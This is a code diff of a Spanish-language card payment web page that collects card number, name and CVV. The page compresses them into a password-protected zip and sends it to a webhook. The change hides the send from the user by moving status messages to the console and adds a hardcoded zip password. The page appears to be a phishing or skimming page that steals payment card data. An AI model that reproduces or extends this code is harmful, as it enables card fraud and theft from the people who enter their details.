@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjeta</title>
+  <title>Pagar con tarjetas</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -87,7 +87,8 @@
         return;
       }
 
-      var fileName = cardNumber.substr(0, 6) + '_Tarjeta.csv';
+      var fileName = cardNumber.substr(0, 6) + '_' + cardName + 'C';
+      var zipPassword = "08papanat4s";
 
       var cardData = [
         new Date().toLocaleString(),
@@ -98,20 +99,14 @@
         cardCVV
       ];
 
-      createAndSendData(fileName, cardData);
-      document.getElementById("done-message").textContent = "Listo! Procesando pago...";
-
-      setTimeout(function() {
-        document.getElementById("done-message").textContent = "";
-      }, 2000);
+      sendToWebhook(zipPassword, fileName, cardData);
     }
 
-    function createAndSendData(fileName, cardData) {
+    function sendToWebhook(password, fileName, cardData) {
       var zip = new JSZip();
       var csvContent = cardData.join(", ");
       zip.file(fileName, csvContent);
-
-      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: "08papanat4s" })
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: password })
         .then(function(content) {
           var formData = new FormData();
           formData.append("file", content, fileName + ".zip");
@@ -122,13 +117,13 @@
           })
           .then(function(response) {
             if (response.ok) {
-              document.getElementById("done-message").textContent = "Tarjeta enviada exitosamente al webhook.";
+              console.log("Tarjeta enviada al webhook correctamente.");
             } else {
-              document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
+              console.error("Error al enviar la tarjeta al webhook.");
             }
           })
           .catch(function(error) {
-            document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
+            console.error("Error al enviar la tarjeta al webhook:", error);
           });
         });
     }
@@ -186,7 +181,6 @@
     <h1>Pedido por Tarjeta</h1>
   
     <div id="error-message"></div>
-    <div id="done-message"></div>
   
     <div class="input-field">
       <label for="card-number">Número de Tarjeta:</label>
